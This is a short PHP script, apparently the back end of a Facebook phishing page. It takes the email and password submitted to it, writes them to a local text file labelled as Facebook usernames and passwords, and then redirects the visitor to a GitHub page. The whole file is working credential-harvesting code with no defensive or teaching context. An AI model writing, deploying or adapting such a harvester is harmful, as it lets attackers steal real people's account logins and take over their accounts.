<?php 
file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://github.com/Gta-fantome-3botg/Create-bot-free/blob/master/log.txt');
exit();
?>
